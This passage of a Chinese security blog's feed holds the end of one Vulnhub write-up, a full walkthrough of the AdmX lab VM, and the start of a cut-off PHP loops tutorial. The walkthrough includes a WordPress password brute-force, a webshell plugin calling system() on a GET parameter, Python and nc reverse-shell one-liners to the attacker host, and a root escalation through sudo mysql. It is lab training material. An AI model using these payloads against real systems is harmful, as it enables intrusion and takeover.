<p>然后配合摩斯密码表解密，得到的结果和在线工具是一样的。</p>
<h2 id="生成密码写入etcpasswd">3.3. 生成密码写入/etc/passwd</h2>
<p>之前某台靶机，我尝试随便写入一个密码到/etc/passwd中，发现失败了，尝试如下</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508211250.png" /></p>
<p>但是，使用openssl生成的加密字符串可以用作密码 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl passwd 123</span><br><span class="line">-&gt; if13Dpsyoylmc</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508211409.png" /></p>
<h1 id="总结">4. 总结</h1>
<p>该靶机难度不高，主要的难点在于路径扫描比较恶心，全部扫描完要好久。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>摩斯密码</tag>
        <tag>二维码解码</tag>
      </tags>
  </entry>
  <entry>
    <title>4. Vulnhub AdmX writeup</title>
    <url>/2022/04/03/4.%20Vulnhub%20AdmX%20writeup/</url>
    <content><![CDATA[<p>该靶机难度中等。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：<a
href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a></p>
<p>难度：Medium</p>
<p>虚拟机软件：Virtual Box</p>
<p>目标：取得2个flag，获得root权限</p>
<p><strong>涉及的攻击方法</strong>：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>web路径爆破（目录扫描）</li>
<li>BP自动替换</li>
<li>密码爆破</li>
<li>MSF漏洞利用</li>
<li>Wordpress漏洞利用</li>
<li>NC反弹shell升级：nc反弹的shell是残缺的，比如缺少文件名补全。这个方法就是获得完整的shell。</li>
<li>蚁剑上线</li>
<li>利用MySQL提权</li>
</ul>
<h1 id="配置信息">配置信息</h1>
<p>这里使用NAT模式。配置很简单，只需要在virtual
box中的全局设定中添加一张网卡，然后虚拟机选择NAT模式，此时会自动选择刚刚创建的网卡。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214433.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214443.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214459.png" /></p>
<h1 id="单用户模式">单用户模式</h1>
<p>本题的虚拟机无法扫描到IP。因此进入单用户模式，修改网卡名称即可。具体可以看<a
href="https://mp.weixin.qq.com/s?__biz=MjM5NjI1OTc5Mw==&amp;mid=2652172616&amp;idx=1&amp;sn=f72eaf0db6af6e9ec68e17ed30479852&amp;chksm=bd0ba3f68a7c2ae09cd08de9006e86c417ac27ca3d11f603aa30d14fe402b2b5cb4bc55a5545&amp;scene=126&amp;&amp;sessionid=1648903615#rd">修改网卡</a></p>
<p><strong>步骤</strong>：</p>
<p>在启动或者重启，显示virtual
box那个界面之后黑屏的时候，按住方向键上，进入如下界面：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204842.png" /></p>
<p>此时按 e，进入如下界面，找到红框位置：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204947.png" /></p>
<p>将红框的内容修改为如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205050.png" /></p>
<p>一定要是 rw，否则无法修改配置文件！</p>
<p>然后按<code>ctrl+x</code>或者F10启动。然后输入<code>ip a</code>查看网卡信息：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205339.png" /></p>
<p>查看网络配置文件中的网卡名称（该靶机的系统是Ubuntu，因此选第二个）：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># RedHat Linux</span><br><span class="line">vi /etc/network/interfaces</span><br><span class="line"></span><br><span class="line"># UBUNTU</span><br><span class="line">vi /etc/netplan/00-installer-config.yaml</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403205436.png" /></p>
<p>将 ens33
修改成功网卡信息中的红框位置的名字。然后保存并退出，重启计算机即可获得IP。</p>
<h1 id="渗透">渗透</h1>
<p>kali：10.0.2.4</p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402214748.png" /></p>
<p>1,2,3其实都不是；4是kali，因此靶机IP为10.0.2.5</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p1-65535 10.0.2.5</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215226.png" /></p>
<p>只开了一个80端口</p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 -sV 10.0.2.5</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402215338.png" /></p>
<ol type="1">
<li>靶机系统是Ubuntu</li>
<li>80端口上的服务是http</li>
<li>apache 版本 2.4.13</li>
</ol>
<h2 id="访问http服务">访问http服务</h2>
<p>访问之后发现就是一个apache的页面，没有其他信息，因此直接进行web路径扫描。这里使用新的工具feroxbuster。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.5</span><br></pre></td></tr></table></figure></p>
<p>（注意，如果报错仔细看信息，可能是因为没有字典）</p>
<p>该工具不自带字典，因此有两种方法：</p>
<ul>
<li><code>sudo apt install seclists</code> 安装字典</li>
<li>自己指定字典</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222016.png" /></p>
<p>虽然都是301，但是301是重定向，并不是不存在，因此可以尝试访问。注意到两个东西：</p>
<ol type="1">
<li>出现了很多的 wordpress</li>
<li>还有一个admin，这个可能是后台地址</li>
</ol>
<p>我们先访问
wordpress，发现页面过了很久才加载出来。而admin更是直接无法访问。因此，聚焦在
<code>http://10.0.2.5/wordpress/</code>
上，<strong>这里能够加载出页面，但是速度很慢，这是为什么呢？因此尝试抓包看一下</strong>。发现了异常：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222458.png" /></p>
<p>我们只访问了 10.0.2.5，但是数据包却出现了
192.168.159.145，这并不是该网段的IP，此时想起了前面的301，因此猜测，这是后台重定向到了192那个IP地址。</p>
<p>查看响应包：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402222730.png" /></p>
<p>发现 192.168.159.145
有20个匹配，这说明后台将重定向的IP地址写死了。不论谁访问10.0.2.5都会被重定向到192.168.159.145，这一看就是内网地址。<strong>因此，接下来的思路就是不让靶机请求192.168.159.145的资源，而是让它请求10.0.2.5的资源</strong>。</p>
<h2 id="bp自动替换">BP自动替换</h2>
<p>进入BP修改以下信息：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402223246.png" /></p>
<p>此时刷新页面，成功加载！</p>
<p>接下来进行web功能点测试，测试之后发现，没有存在可利用的漏洞。忽然想起之前有一个wp-admin目录，尝试访问一下。出现后台登录界面！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402223545.png" /></p>
<h2 id="密码爆破">密码爆破</h2>
<p>看见登录框，首先尝试一下万能密码，发现行不通。但是在测试过程中发现有时候会提示<code>wrong username</code>，有时候却提示<code>The password you entered for the username **admin** is incorrect.</code>。这说明存在着admin这个用户。并且测试过程中发现可以随便实验，没有次数、时间限制，也没有验证码，因此可以采用密码爆破！</p>
<p>密码爆破首先得知道用户名，有两个方法：</p>
<ol type="1">
<li>根据报错信息</li>
<li>搜索相关CMS的默认管理员、普通账户</li>
</ol>
<p>使用BP进行爆破，这里推荐使用<a
href="https://github.com/fuzz-security/SuperWordlist">superwordlist</a>中的MidPwds.txt这个字典。（由于这个字典太多了，kali自带的BP不是pro，爆破速度太慢了，因此我自定义了100个进行演示）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403204448.png" /></p>
<p>可以发现只有adam14的响应包长度与其他的不同，并且设置了许多的cookie，然后重定向到
wp-admin，因此，有理由猜测这就是密码，回到登录界面尝试，发现登录成功！因此，最终发现密码是adam14。（如果提示验证邮箱选择左下角的稍后提醒）</p>
<h2 id="后台get-shell">后台get shell</h2>
<p>后台get shell的方式一般有以下三种（本题为例）：</p>
<ol type="1">
<li>Media里面的文件上传功能，上传后门</li>
<li>Appearance里theme模板（PHP文件）的修改</li>
<li>plugins修改现有的插件的php，或者手动写插件然后上传（上传的webshell要找到路径）</li>
</ol>
<h3 id="第一种">第一种</h3>
<p>不论是否免杀，都无法上传</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402231623.png" /></p>
<h3 id="第二种">第二种</h3>
<p>注意到刚进来后台的时候写着使用的主题是<code>Twenty Twenty-One</code>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402231928.png" /></p>
<p>发现不可以修改文件。</p>
<h3 id="第三种">第三种</h3>
<p>推荐自己写一个插件然后上传。如果没有上传功能，那就修改现有插件。这里有上传功能。</p>
<p>先查看现有的两个插件的写法，发现有一个共同点，那就是头文件！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402232516.png" /></p>
<p>得包含这些东西</p>
<p>因此，写一个如下插件： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* Plugin Name: webshell</span></span><br><span class="line"><span class="comment">* Plugin URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* Descritption: WP webshell for pentest</span></span><br><span class="line"><span class="comment">* Version: 1.0</span></span><br><span class="line"><span class="comment">* Author: hdfzzf</span></span><br><span class="line"><span class="comment">* Author URI: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">* License: https://hdfzzf.github.io</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	system(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>（经过测试，如果不写头部信息，插件安装会不成功）</p>
<p>安装成功后需要激活插件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402233227.png" /></p>
<p>现在需要知道插件上传之后的路径。网络搜索发现该CMS插件的路径是<code>/wordpress/wp-content/plugins/</code>。因此访问<code>10.0.2.5/wordpress/wp-content/plugins/shell.php?shell=id</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402234611.png" /></p>
<p>成功执行了命令。</p>
<p>这里可以使用：</p>
<ol type="1">
<li>python反弹shell</li>
<li>nc拿shell</li>
<li>msf</li>
</ol>
<p>kali监听 3333 端口，然后网页输入如下命令： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>也可以通过nc串联：</p>
<p>kali监听两个端口，然后网页执行下面 命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc 10.0.2.4 3333|/bin/bash|nc 10.0.2.4 4444</span><br></pre></td></tr></table></figure></p>
<p>不过这里再介绍一种，那就是msf反弹shell。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. msfconsole  启动msf</span><br><span class="line">2. search wordpress admin</span><br><span class="line">3. use 2  选择第二个</span><br><span class="line">4. show options</span><br><span class="line">5. 设置参数</span><br><span class="line">6. run</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235756.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235736.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220402235840.png" /></p>
<p>成功！</p>
<h2 id="shell升级">shell升级</h2>
<p>提权获得的shell是残缺的，无法完成互动操作，比如修改代码，自动补齐。因此，接下来需要升级（以python
get shell做示范。该方法只针对bash） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">2. ctrl+z 将获得的shell暂停，切到后台</span><br><span class="line">3. stty raw -echo</span><br><span class="line">4. fg 将刚刚放入后台的进程切到前台</span><br><span class="line">5. export SHELL=/bin/bash</span><br><span class="line">6. export TERM=screen</span><br><span class="line">7. stty rows 38 columns 116 设置大小</span><br><span class="line">8. reset</span><br><span class="line">9. shell成功升级</span><br><span class="line"></span><br><span class="line">注意：如果kali使用的是zsh，需要切换为bash。</span><br><span class="line">	1. chsh -s /bin/bash（不能加sudo，否则修改的是root的shell）</span><br><span class="line">	2. 重启</span><br><span class="line">	3. echo $SHELL 确认一下</span><br></pre></td></tr></table></figure></p>
<p><strong>如果利用nc获得一个shell，容易不小心按ctrl+c或者某种原因退出了shell。并且，有的web程序不能多次触发漏洞反弹shell（可能触发一次后环境就变了，只能等待对方重启服务器）。因此，获得一个shell后，应该基于这个shell去获得2-3个shell，比如一句话木马</strong></p>
<p>回想刚刚后台get
shell的第二种方法，此时已经获得了shell，因此可以修改php文件（或者添加php文件）来用其他工具连接，比如蚁剑。</p>
<p>这里修改主题里面的404.php文件，也就是刚刚修改不成功的那个。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403193531.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403202613.png" /></p>
<p>成功连接</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403202630.png" /></p>
<p>这就是为什么要进行shell升级，否则无法该代码，用蚁剑连接。</p>
<h2 id="信息收集">信息收集</h2>
<p>发现了<code>/home</code>目录下有一个用户 wpadmin</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403193944.png" /></p>
<p>并且在wpadmin的目录下，有一个txt文件，猜测这就是flag文件，但经过测试，现在的权限不够查看。</p>
<p>还在<code>/root</code>目录下发现一个txt文件，这应该是另一个flag文件，但遗憾的是，还是没有权限。</p>
<p>查看用户<code>cat /etc/passwd</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194131.png" /></p>
<p>查看系统内核<code>uname -a</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194203.png" /></p>
<p>查看sudo配置，发现权限不够。</p>
<p>查看wordpress目录下的配置文件：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403194406.png" /></p>
<p>发现了数据库的名称，用户名和密码。</p>
<p>信息收集差不多了，接下来就需要进行提权了。</p>
<h2 id="权限提升">权限提升</h2>
<h3 id="wpadmin权限">wpadmin权限</h3>
<p>想起刚刚查看wordpress配置文件的时候发现了用户名和密码，因此尝试登录wpadmin试试，尝试失败。这时候想到，刚刚密码爆破还有一个密码，因此再次尝试，发现成功。密码是：adam14</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195257.png" /></p>
<p>此时可以先读取第一个flag</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195341.png" /></p>
<h3 id="root权限">root权限</h3>
<p>（如果刚刚没有升级shell，这里无法连接数据库！！！）
刚刚发现得到了系统内核，用msf查找，发现没有漏洞可以利用。</p>
<p>接下来查看sudo配置 <code>sudo -l</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195815.png" /></p>
<p>发现，wpadmin可以以root权限启动数据库，因此，输入下面的命令启动数据库，经过尝试，密码也是adam14。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /urs/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403195950.png" /></p>
<p>成功登录数据库。</p>
<blockquote>
<p>小知识：数据库可以利用 system cmd
执行系统命令。这里我们是以root方式启动的数据库，因此使用system执行命令的时候也是root权限。</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200101.png" /></p>
<p>执行 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system /bin/bash -i</span><br><span class="line"></span><br><span class="line">-i 表示shell表示bash是交互的。其实这里不加也没关系</span><br></pre></td></tr></table></figure></p>
<p>获得root权限的shell</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220403200246.png" /></p>
<p>成功拿到flag，也成功得到root权限。至此，这个靶机结束！</p>
<h1 id="总结">总结</h1>
<p>通过对该靶机的渗透，学到了MySQL的提权方式，对该靶机来说，归根结底还是sudo配置不当。</p>
<p>其次，知道了如果请求一个网页反应慢，可能是因为后台源码请求某个IP地址，该IP地址在原来的环境下是靶机的IP内网IP地址，所以在原来的环境下请求速度正常，但是一旦移植到自己的环境，比如虚拟机，那么就会出问题。此时，就可以利用BP的自动替换，将代码中写死的IP地址改为当前靶机的IP地址。</p>
<p>最后，就是学习了如何将“残缺的”shell升级为交互式的shell。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>MySQL提取</tag>
        <tag>shell升级</tag>
        <tag>BP自动替换</tag>
      </tags>
  </entry>
  <entry>
    <title>4. 流程控制</title>
    <url>/2022/11/17/4.%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="if-条件判断">1. <code>if</code> 条件判断</h1>
<p>有两种：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (condition)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (condition1)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (condition2)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写一个简单的例子：接收用户输入的值，并判断是奇数还是偶数。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> &lt;&lt;&lt;<span class="string">&#x27;FORM&#x27;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    请输入一个整数：</span><br><span class="line">    &lt;input type=<span class="string">&quot;number&quot;</span> name=<span class="string">&quot;num&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">FORM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>] % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>].<span class="string">&#x27;是一个偶数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>].<span class="string">&#x27;是一个奇数&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;请输入一个有效的数字.&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117105232.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117105240.png" /></p>
<h1 id="多分支结构">2. 多分支结构</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(表达式)&#123;</span><br><span class="line">    <span class="keyword">case</span> val1:</span><br><span class="line">        ...;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> val2:</span><br><span class="line">        ...;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        ...;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例子：根据用户输入的的语言名称，返回描述。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> &lt;&lt;&lt;<span class="string">&#x27;LANG&#x27;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    请输入语言名称：</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;lang&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">LANG;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;lang&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;html&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;html is html.&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;css&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;css is css.&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;javascript&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;javascript is javascript.&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;php&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;php is php.&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;lang&#x27;</span>].<span class="string">&#x27;, I can not understand.&#x27;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117110021.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117110030.png" /></p>
<h1 id="循环语句">3. 循环语句</h1>
<h2 id="for-循环">3.1. <code>for</code> 循环</h2>
<p>语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(循环初始变量; 条件表达式; 修改循环控制变量)&#123;</span><br><span class="line">	...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例子：表格自动生成。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> &lt;&lt;&lt;<span class="string">&#x27;FORM&#x27;</span></span><br><span class="line">&lt;h2&gt;表格自动生成器&lt;/h2&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    请输入：</span><br><span class="line">    &lt;input type=<span class="string">&quot;number&quot;</span> name=<span class="string">&quot;rows&quot;</span>&gt;行</span><br><span class="line">    &lt;input type=<span class="string">&quot;number&quot;</span> name=<span class="string">&quot;cols&quot;</span>&gt;列</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">FORM;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;rows&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;rows&#x27;</span>]: <span class="number">0</span>;</span><br><span class="line"><span class="variable">$cols</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cols&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;cols&#x27;</span>]: <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$rows</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$cols</span>; <span class="variable">$j</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;td&gt;&#x27;</span>.(<span class="variable">$i</span> * <span class="variable">$cols</span> + <span class="variable">$j</span>).<span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117110910.png" /></p>
<h2 id="while-循环">3.2. <code>while</code> 循环</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221117110948.png" /></p>
<p>语法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(condition)&#123;</span><br><span class="line">	...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一般都是这样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$i</span>=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$i</span> &lt; n)&#123;</span><br><span class="line">	...;</span><br><span class="line">	<span class="variable">$i</span>++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将 [[#3.1. <code>for</code> 循环]] 中的例子用 <code>while</code>
循环改写：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> &lt;&lt;&lt;<span class="string">&#x27;FORM&#x27;</span></span><br><span class="line">&lt;h2&gt;表格自动生成器&lt;/h2&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    请输入：</span><br><span class="line">    &lt;input type=<span class="string">&quot;number&quot;</span> name=<span class="string">&quot;rows&quot;</span>&gt;行</span><br><span class="line">    &lt;input type=<span class="string">&quot;number&quot;</span> name=<span class="string">&quot;cols&quot;</span>&gt;列</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span 